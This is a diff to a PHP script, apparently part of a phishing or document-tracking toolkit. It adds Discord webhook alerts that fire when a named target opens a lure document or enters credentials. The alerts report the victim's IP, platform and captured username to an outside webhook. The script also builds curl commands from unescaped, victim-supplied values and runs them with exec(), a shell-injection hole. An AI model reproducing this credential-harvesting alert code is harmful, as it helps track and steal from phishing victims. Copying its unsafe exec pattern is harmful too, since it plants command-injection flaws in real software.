@@ -188,6 +188,8 @@ $message = "> Document opened by ".$target." at ".$org." on ".$browser['platform
 
 $messagepush =  "Document opened by ".$target." at ".$org." on ".$browser['platform']."! (".$ip.")";
 
+$messagediscord = "> Document opened by ".$target." at ".$org." on ".$browser['platform']."! ([".$ip."](".$APIResultsURL."?UUID=".$id."))";
+
 }
 
 if($target == "" && $org != ""){
@@ -196,6 +198,8 @@ $message = "> Document opened at ".$org." on ".$browser['platform']."! (<".$APIR
 
 $messagepush = "Document opened at ".$org." on ".$browser['platform']."! (".$ip.")";
 
+$messagediscord = "> Document opened at ".$org." on ".$browser['platform']."! ([".$ip."](".$APIResultsURL."?UUID=".$id."))";
+
 }
 
 if($target != "" && $org == ""){
@@ -203,6 +207,8 @@ if($target != "" && $org == ""){
 $message = "> Document opened by ".$target." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";
 
 $messagepush = "Document opened by ".$target." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";
+
+$messagediscord = "> Document opened by ".$target." on ".$browser['platform']."! ([".$ip."](".$APIResultsURL."?UUID=".$id."))";
 
 }
 
@@ -224,6 +230,8 @@ $message = "> ".$target." just entered their credentials at ".$org."! (<".$APIRe
 
 $messagepush = $target." just entered their credentials at ".$org."! (".$basicauthuser.")";
 
+$messagediscord = "> ".$target." just entered their credentials at ".$org."! ([".$basicauthuser."](".$APIResultsURL."?UUID=".$id."))";
+
 //$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
 //echo $cmd;
 //exec($cmd);
@@ -240,6 +248,15 @@ exec($cmd);
 $cmdpush = 'cd ../config && php push.php "'.$messagepush.'" "DocBot" "./doc.png" "'.$APIResultsURL.'?UUID='.$id.'" "DocBot"';
 
 exec($cmdpush);
+
+
+
+// Execute Discord Incoming Webhook
+
+$cmddiscord = 'curl -s -X POST -d \'{"username": "'.$slackbotname.'", "content": "'.$messagediscord.'", "avatar_url": "https://i.imgur.com/5za75GD.png"}\' '.$DiscordWebhook.' -H \'Content-Type:application/json\'';
+
+exec($cmddiscord);
+
 
 }
 }
